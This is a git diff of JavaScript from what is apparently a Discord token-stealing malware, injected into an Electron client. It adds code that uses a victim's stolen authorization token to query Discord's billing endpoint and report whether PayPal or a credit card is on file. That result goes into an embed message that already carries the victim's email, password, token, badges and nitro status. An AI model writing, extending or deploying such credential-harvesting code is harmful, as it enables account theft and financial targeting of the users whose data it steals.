@@ -180,6 +180,33 @@ function Login(email, password, token) {
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
+	    			window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        xmlHttp.responseText`, !0).then((info3) => {
+					
+function Cool() {
+	const json = JSON.parse(info3)
+	var billing = "";
+	json.forEach(z => {
+		if (z.type == "") {
+			return "\`❌\`"
+		} else if (z.type == 2 && z.invalid != !0) {
+			billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+		} else if (z.type == 1 && z.invalid != !0) {
+			billing += "\`✔️\`" + " :credit_card:"
+		} else {
+			return "\`❌\`"
+		}
+	})
+	if (billing == "") {
+		billing = "\`❌\`"
+	}
+	return billing
+}
+					
         const json = JSON.parse(info);
         var params = {
             username: "stenko",
@@ -192,12 +219,12 @@ function Login(email, password, token) {
                     "color": 3092790,
                     "fields": [
                         {
-                            "name": " name",
+                            "name": " <:partner:909102089513340979> name",
 			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
-                            "inline": true
+                            "inline": false
                         },
                         {
-                            "name": " id",
+                            "name": " <:partner:909102089513340979> id",
                             "value": `\`` + json.id + `\``,
                             "inline": true
                         },
@@ -209,7 +236,7 @@ function Login(email, password, token) {
                         {
                             "name": " email",
                             "value": `\`${email}\``,
-                            "inline": true
+                            "inline": false
                         },
                         {
                             "name": " password",
@@ -222,9 +249,19 @@ function Login(email, password, token) {
                             "inline": false
                         }, 
                         {
+                            "name": " payment method",
+                            "value": `\`${Cool()}\``,
+                            "inline": false
+                        },
+                        {
+                            "name": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
+                            "inline": false
+                        }, 
+                        {
                             "name": " badges",
                             "value": `\`${GetBadges(json.flags)}\``,
-                            "inline": true		    
+                            "inline": false		    
                         },
                         {
                             "name": " nitro",
